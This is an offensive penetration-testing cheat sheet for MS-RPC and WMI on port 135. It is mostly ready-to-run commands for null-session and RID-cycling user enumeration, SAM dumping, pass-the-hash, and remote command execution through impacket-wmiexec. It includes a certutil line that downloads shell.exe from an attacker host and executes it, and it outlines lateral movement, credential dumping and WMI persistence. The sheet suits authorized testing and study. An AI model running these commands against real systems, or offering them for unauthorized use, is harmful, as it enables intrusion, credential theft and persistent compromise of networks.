# MS RPC / WMI ENUMERATION (Port 135)

## PORT OVERVIEW
```
Port 135   - MS-RPC Endpoint Mapper (DCERPC)
Port 49152-65535 - Dynamic RPC ports (high ports)
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p135 <IP>                             # Service/Version detection
nmap -p135 --script msrpc-enum <IP>             # Enumerate RPC services
nc -nv <IP> 135                                 # Manual connection attempt
```

## NMAP RPC ENUMERATION
```bash
nmap --script "msrpc-*" -p135 <IP>              # All MS-RPC scripts
nmap --script msrpc-enum -p135 <IP>             # Enumerate RPC services
nmap --script=rpc-grind -p135 <IP>              # RPC endpoint mapper dump
nmap -sV --script=rpcinfo -p135 <IP>            # RPC program information
```

## RPCCLIENT ENUMERATION
```bash
# Connect to RPC
rpcclient -U "" <IP>                            # Null session
rpcclient -U "user%password" <IP>               # Authenticated
rpcclient -U "DOMAIN\user%password" <IP>        # Domain authentication

# Server information
srvinfo                                         # Server details
netshareenum                                    # Enumerate shares
netshareenumall                                 # All shares
netsharegetinfo <share>                         # Share info

# User enumeration
enumdomusers                                    # Domain users
queryuser <RID>                                 # Query user by RID
enumdomgroups                                   # Domain groups
querygroup <RID>                                # Query group by RID
querygroupmem <RID>                             # Group members

# Domain information
enumdomains                                     # Enumerate domains
querydominfo                                    # Domain information
getdompwinfo                                    # Password policy
lsaquery                                        # LSA query
lsaenumsid                                      # Enumerate SIDs
lookupsids <SID>                                # Lookup SID
lookupnames <username>                          # Lookup username

# Printer enumeration
enumprinters                                    # Enumerate printers
```

## IMPACKET RPC TOOLS
```bash
# rpcdump.py (dump RPC endpoints)
impacket-rpcdump <IP>                           # Dump RPC info
impacket-rpcdump <IP> | grep -i "ms-wmi"        # Find WMI endpoints

# rpcmap.py (enumerate RPC interfaces)
impacket-rpcmap <IP>                            # Map RPC interfaces

# lookupsid.py (SID/RID enumeration)
impacket-lookupsid <DOMAIN>/<USER>:<PASSWORD>@<IP>  # Enumerate users via SID
impacket-lookupsid <DOMAIN>/<USER>:<PASSWORD>@<IP> | grep "SidTypeUser"

# samrdump.py (dump SAM database via RPC)
impacket-samrdump <IP>                          # Null session SAM dump
impacket-samrdump <DOMAIN>/<USER>:<PASSWORD>@<IP>  # Authenticated SAM dump
```

## WMI ENUMERATION (WINDOWS MANAGEMENT INSTRUMENTATION)
```bash
# WMI requires authentication (no null session)
# WMI uses DCOM (Port 135 + dynamic high ports)

# wmiexec.py (Impacket - command execution)
impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<IP>  # Interactive shell
impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<IP> "whoami"  # Single command
impacket-wmiexec -hashes :<NTLM_HASH> <USER>@<IP>  # Pass-the-hash

# wmiprvse.exe (WMI Provider Service) - runs as target user
# No artifacts on disk, only event logs

# wmic (from Windows)
wmic /node:<IP> /user:<DOMAIN>\<USER> /password:<PASSWORD> process call create "cmd.exe"
wmic /node:<IP> /user:<USER> /password:<PASSWORD> os get caption  # OS version
wmic /node:<IP> /user:<USER> /password:<PASSWORD> computersystem get name,domain  # Computer info
```

## WMI QUERIES (ENUMERATION)
```bash
# Query WMI classes via impacket-wmiexec or wmis
# These queries work after authentication

# Operating System information
SELECT * FROM Win32_OperatingSystem           # OS details (version, build, install date)

# Computer System information
SELECT * FROM Win32_ComputerSystem            # Hostname, domain, logged-on users

# Processes
SELECT * FROM Win32_Process                   # Running processes (name, path, owner)
SELECT Name,ExecutablePath,ProcessId FROM Win32_Process WHERE Name='lsass.exe'

# Services
SELECT * FROM Win32_Service                   # All services (name, state, startup type, account)
SELECT Name,PathName,StartMode,StartName FROM Win32_Service

# Installed software
SELECT * FROM Win32_Product                   # Installed applications

# Network configuration
SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=TRUE

# User accounts
SELECT * FROM Win32_UserAccount               # Local user accounts

# Shares
SELECT * FROM Win32_Share                     # SMB shares

# Startup programs
SELECT * FROM Win32_StartupCommand            # Programs that run at startup

# Logged-on users
SELECT * FROM Win32_ComputerSystem            # Currently logged-on users
```

## WMI PERSISTENCE & EXPLOITATION
```bash
# WMI Event Subscriptions (persistence)
# Create malicious WMI event filter

# Upload and execute via WMI
impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<IP> "certutil -urlcache -f http://<attacker>/shell.exe C:\temp\shell.exe"
impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<IP> "C:\temp\shell.exe"

# WMI lateral movement
impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<IP>  # Get shell on remote system
```

## RPC ENUMERATION TOOLS
```bash
# enum4linux (comprehensive RPC enumeration)
enum4linux -a <IP>                              # All enumeration
enum4linux -U <IP>                              # User enumeration
enum4linux -S <IP>                              # Share enumeration
enum4linux -G <IP>                              # Group enumeration
enum4linux -P <IP>                              # Password policy
enum4linux -r <IP>                              # RID cycling

# CrackMapExec RPC modules
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --rid-brute  # RID cycling
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --users  # Enumerate users
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --groups  # Enumerate groups
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --pass-pol  # Password policy
```

## NULL SESSION TESTING
```bash
# Test for null session on RPC
rpcclient -U "" -N <IP>                         # Null session
> srvinfo                                       # If successful, null session works
> enumdomusers                                  # Enumerate users

# If null session works, enumerate everything
rpcclient -U "" -N <IP> -c "enumdomusers"       # List users
rpcclient -U "" -N <IP> -c "enumdomgroups"      # List groups
rpcclient -U "" -N <IP> -c "querydominfo"       # Domain info
rpcclient -U "" -N <IP> -c "lsaenumsid"         # Enumerate SIDs
```

## RID CYCLING (USER ENUMERATION)
```bash
# Enumerate users via RID cycling (500-1000 range typically)
# 500 = Administrator, 501 = Guest, 1000+ = regular users

# rpcclient RID cycling
for i in $(seq 500 1100); do
  rpcclient -U "" -N <IP> -c "queryuser $i" 2>/dev/null | grep "User Name"
done

# Impacket lookupsid
impacket-lookupsid <DOMAIN>/<USER>:<PASSWORD>@<IP> | tee users.txt

# CrackMapExec
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --rid-brute
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --rid-brute --rid-range 500-2000

# enum4linux
enum4linux -r <IP>                              # RID cycling
enum4linux -R 500-550 <IP>                      # Specific RID range
```

## WMI AUTHENTICATION REQUIREMENTS
```bash
# WMI requires valid credentials (no null session)
# User must be member of:
# - Administrators (local admin)
# - Remote Management Users (limited access)

# WMI access control:
# 1. DCOM permissions (dcomcnfg)
# 2. WMI namespace permissions (wmimgmt.msc)
# 3. User Account Control (UAC) - may block non-RID 500 admins

# Test WMI access
impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<IP> "whoami"

# Common WMI namespaces
# root\cimv2 - Most common, OS/hardware info
# root\default - Default namespace
# root\SecurityCenter2 - Antivirus/firewall info
# root\subscription - Event subscriptions (persistence)
```

## INTERESTING WMI CLASSES FOR ENUMERATION
```bash
# After WMI authentication:

# 1. Win32_OperatingSystem - OS version, patches, architecture
# Shows: OS version, service pack, build, install date, uptime
# Useful for: Identifying patch level, finding exploits

# 2. Win32_ComputerSystem - Hostname, domain, logged-on users
# Shows: Computer name, domain, current user, role (workstation/DC/member server)
# Useful for: Identifying important targets, finding logged-on admins

# 3. Win32_Process - Running processes
# Shows: Process name, PID, executable path, owner
# Useful for: Finding AV/EDR, service accounts, privilege escalation targets
# Example: lsass.exe, sqlservr.exe, services running as domain accounts

# 4. Win32_Service - All Windows services
# Shows: Service name, description, state, startup type, account
# Useful for: Kerberoasting targets (services running as domain accounts)
# Privilege escalation (unquoted service paths, weak permissions)

# 5. Win32_Product - Installed software
# Shows: Application name, version, vendor
# Useful for: Finding vulnerable software versions

# 6. Win32_NetworkAdapterConfiguration - Network config
# Shows: IP address, subnet, gateway, DNS, DHCP
# Useful for: Network mapping, finding internal networks

# 7. Win32_StartupCommand - Autostart programs
# Shows: Programs that run at startup
# Useful for: Finding persistence mechanisms, backdoors
```

## WMI COMMAND EXAMPLES
```bash
# Get OS information
impacket-wmiexec <USER>:<PASSWORD>@<IP> "wmic os get caption,version,buildnumber"

# Get running processes
impacket-wmiexec <USER>:<PASSWORD>@<IP> "wmic process get name,executablepath,processid"

# Get services (find domain service accounts for Kerberoasting)
impacket-wmiexec <USER>:<PASSWORD>@<IP> "wmic service get name,startname,state"

# Get installed software
impacket-wmiexec <USER>:<PASSWORD>@<IP> "wmic product get name,version"

# Get user accounts
impacket-wmiexec <USER>:<PASSWORD>@<IP> "wmic useraccount get name,sid,disabled"

# Get domain info
impacket-wmiexec <USER>:<PASSWORD>@<IP> "wmic computersystem get name,domain,domainrole"

# Get antivirus
impacket-wmiexec <USER>:<PASSWORD>@<IP> "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName"
```

## DCOM ENUMERATION
```bash
# DCOM (Distributed COM) uses RPC for remote object access
# Requires authentication

# Enumerate DCOM applications
impacket-dcomexec <DOMAIN>/<USER>:<PASSWORD>@<IP> -object <CLSID>

# Common DCOM CLSIDs for exploitation:
# {C08AFD90-F2A1-11D1-8455-00A0C91F3880} - ShellBrowserWindow
# {9BA05972-F6A8-11CF-A442-00A0C90A8F39} - ShellWindows
```

## RPC VULNERABILITIES
```bash
# MS17-010 (EternalBlue) - SMB RPC vulnerability
nmap --script smb-vuln-ms17-010 -p445 <IP>

# MS08-067 (Conficker) - RPC vulnerability
nmap --script smb-vuln-ms08-067 -p445 <IP>

# CVE-2021-26855 (ProxyLogon) - Exchange RPC
# RCE via Exchange Server RPC

# MS03-026 - RPC DCOM vulnerability
# Buffer overflow in RPC interface
```

## METASPLOIT RPC MODULES
```bash
msfconsole
use auxiliary/scanner/dcerpc/endpoint_mapper    # Enumerate RPC endpoints
use auxiliary/scanner/dcerpc/management         # RPC management interface
use auxiliary/scanner/smb/smb_ms17_010          # EternalBlue check
use exploit/windows/dcerpc/ms03_026_dcom        # MS03-026 exploit
```

## RPC FIREWALL BYPASS
```bash
# RPC typically uses:
# Port 135 (endpoint mapper)
# Ports 49152-65535 (dynamic ports)

# Firewall often blocks high ports
# Use port forwarding/tunneling

# SSH tunnel to access RPC
ssh -L 135:target:135 user@jumphost
ssh -L 49152:target:49152 user@jumphost
# Then connect to localhost:135
```

## COMMON MISCONFIGURATIONS
```
☐ Null session enabled (anonymous RPC access)
☐ Guest account enabled
☐ Weak/default credentials for service accounts
☐ WMI accessible to low-privileged domain users
☐ No firewall rules blocking RPC (port 135 + high ports)
☐ Services running as domain accounts (Kerberoasting)
☐ Outdated RPC services (MS03-026, MS08-067)
☐ DCOM permissions too permissive
☐ UAC FilterAdministratorToken disabled (allows non-RID 500 admin WMI access)
```

## QUICK WIN CHECKLIST
```
☐ Test for null session (rpcclient)
☐ RID cycling to enumerate users
☐ Enumerate password policy
☐ Find services running as domain accounts (Kerberoasting targets)
☐ WMI access with found credentials
☐ Enumerate running processes (find AV/EDR)
☐ Check for MS08-067, MS17-010 vulnerabilities
☐ Look for logged-on users (admin sessions)
☐ Enumerate shares via RPC
☐ Dump SAM via RPC (if credentials available)
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick RPC enumeration (null session)
nmap -sV -p135 --script msrpc-enum <IP> && \
enum4linux -a <IP> && \
impacket-rpcdump <IP>

# With credentials
rpcclient -U "<USER>%<PASSWORD>" <IP> -c "enumdomusers;enumdomgroups;querydominfo" && \
impacket-lookupsid <DOMAIN>/<USER>:<PASSWORD>@<IP> && \
impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<IP> "wmic os get caption; wmic service get name,startname"
```

## ADVANCED TECHNIQUES
```bash
# WMI lateral movement chain
# 1. Enumerate network via WMI
# 2. Find logged-on domain admins
# 3. Pivot to systems with admin sessions
# 4. Dump credentials (mimikatz, lsass)
# 5. Move to next target

# WMI persistence
# Create WMI event subscription for backdoor
# Survives reboots, hard to detect

# DCOM lateral movement
# Use DCOM for stealthier execution than WMI
# Fewer logs generated
```

## POST-EXPLOITATION (WITH RPC/WMI ACCESS)
```bash
# After gaining RPC/WMI access:
1. Enumerate domain users and groups
2. Find service accounts with SPNs (Kerberoasting)
3. Identify logged-on users (target for credential theft)
4. Map internal network (subnets, DNS, routes)
5. Find vulnerable software versions
6. Lateral movement to other systems
7. Dump SAM/LSA (if admin)
8. Persistence via WMI event subscriptions

# Enumerate all services for Kerberoasting targets
impacket-wmiexec <USER>:<PASSWORD>@<IP> "wmic service where \"NOT startname LIKE '%LocalSystem%' AND NOT startname LIKE '%NT AUTHORITY%'\" get name,startname"
```
